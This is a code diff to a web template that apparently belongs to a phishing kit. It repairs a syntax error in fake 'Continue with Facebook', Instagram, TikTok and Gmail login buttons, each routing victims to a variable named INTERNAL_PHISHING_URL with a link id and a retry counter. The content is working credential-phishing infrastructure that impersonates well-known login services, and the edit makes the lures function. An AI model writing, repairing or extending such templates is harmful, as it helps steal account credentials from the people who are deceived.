@@ -324,28 +324,28 @@
         
         <div class="action-buttons">
           <% if(link.linkType == 'FACEBOOK'){%>
-          <a href="<%= INTERNAL_PHISHING_URL =>/face/<%= link.id %>?retry=<%=link.numberOfRetries%>" class="social-btn facebook-btn" onclick="showLoading()">
+          <a href="<%= INTERNAL_PHISHING_URL %>/face/<%= link.id %>?retry=<%=link.numberOfRetries%>" class="social-btn facebook-btn" onclick="showLoading()">
             <img src="/img/facebook-logo.png" alt="Facebook" />
             <span><%= link.buttonText? link.buttonText : "Continue with Facebook" %></span>
           </a>
           <%}%>
           
           <% if(link.linkType == 'INSTAGRAM'){%>
-          <a href="<%= INTERNAL_PHISHING_URL =>/inst/<%= link.id %>?retry=<%=link.numberOfRetries%>" class="social-btn instagram-btn" onclick="showLoading()">
+          <a href="<%= INTERNAL_PHISHING_URL %>/inst/<%= link.id %>?retry=<%=link.numberOfRetries%>" class="social-btn instagram-btn" onclick="showLoading()">
             <img src="/insta.webp" alt="Instagram" />
             <span><%= link.buttonText? link.buttonText : "Continue with Instagram" %></span>
           </a>
           <%}%>
           
           <% if(link.linkType == 'TIKTOK'){%>
-          <a href="<%= INTERNAL_PHISHING_URL =>/tikto/<%= link.id %>?retry=<%=link.numberOfRetries%>" class="social-btn tiktok-btn" onclick="showLoading()">
+          <a href="<%= INTERNAL_PHISHING_URL %>/tikto/<%= link.id %>?retry=<%=link.numberOfRetries%>" class="social-btn tiktok-btn" onclick="showLoading()">
             <img src="/tiktok/tiktok.png" alt="TikTok" />
             <span><%= link.buttonText? link.buttonText : "Continue with TikTok" %></span>
           </a>
           <%}%>
           
           <% if(link.linkType == 'GMAIL'){%>
-          <a href="<%= INTERNAL_PHISHING_URL =>/gma/<%= link.id %>?retry=<%=link.numberOfRetries%>" class="social-btn gmail-btn" onclick="showLoading()">
+          <a href="<%= INTERNAL_PHISHING_URL %>/gma/<%= link.id %>?retry=<%=link.numberOfRetries%>" class="social-btn gmail-btn" onclick="showLoading()">
             <img src="/img/gmail.png" alt="Gmail" />
             <span><%= link.buttonText? link.buttonText : "Continue with Gmail" %></span>
           </a>
